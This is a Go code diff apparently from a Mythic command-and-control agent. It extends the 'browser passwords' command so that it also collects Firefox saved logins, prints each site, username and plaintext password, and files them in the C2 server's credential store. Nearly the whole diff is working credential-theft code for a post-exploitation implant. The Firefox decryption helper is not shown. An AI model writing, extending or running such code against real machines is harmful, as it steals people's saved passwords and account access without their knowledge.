@@ -67,7 +67,39 @@ func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
 
 	switch strings.ToLower(args.Action) {
 	case "passwords":
-		return browserPasswords(args)
+		result := browserPasswords(args)
+		ffEntries, ffErrors := browserFirefoxPasswords(args)
+		if len(ffEntries) > 0 || len(ffErrors) > 0 {
+			var sb strings.Builder
+			sb.WriteString(result.Output)
+			sb.WriteString(fmt.Sprintf("\n=== Firefox Passwords (%d entries) ===\n\n", len(ffEntries)))
+			for _, e := range ffEntries {
+				sb.WriteString(fmt.Sprintf("[%s] %s\n  User: %s\n  Pass: %s\n\n", e.Browser, e.URL, e.Username, e.Password))
+			}
+			for _, errMsg := range ffErrors {
+				sb.WriteString(fmt.Sprintf("  %s\n", errMsg))
+			}
+			result.Output = sb.String()
+			var creds []structs.MythicCredential
+			if result.Credentials != nil {
+				creds = *result.Credentials
+			}
+			for _, e := range ffEntries {
+				if e.Password != "" && e.Username != "" {
+					creds = append(creds, structs.MythicCredential{
+						CredentialType: "plaintext",
+						Account:        e.Username,
+						Credential:     e.Password,
+						Realm:          e.URL,
+						Comment:        fmt.Sprintf("Firefox saved password (%s)", e.Browser),
+					})
+				}
+			}
+			if len(creds) > 0 {
+				result.Credentials = &creds
+			}
+		}
+		return result
 	case "cookies":
 		return browserCookies(args)
 	case "history":
